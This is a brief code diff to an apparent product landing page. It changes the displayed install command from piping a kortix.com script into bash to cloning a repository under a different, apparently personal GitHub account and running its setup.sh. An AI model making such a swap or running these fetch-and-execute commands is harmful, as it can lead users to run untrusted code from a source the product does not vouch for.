@@ -19,7 +19,7 @@ const KortixBoxScene = dynamic(() => import('@/components/landing/KortixBoxScene
   loading: () => <div className="animate-pulse bg-foreground/5 w-full h-full rounded-full blur-3xl opacity-20" />
 });
 
-const INSTALL_CMD = 'curl -fsSL https://kortix.com/install | bash';
+const INSTALL_CMD = 'git clone https://github.com/beko2210/company.git && cd company && ./setup.sh';
 
 // ─── Reusable Components ────────────────────────────────
 
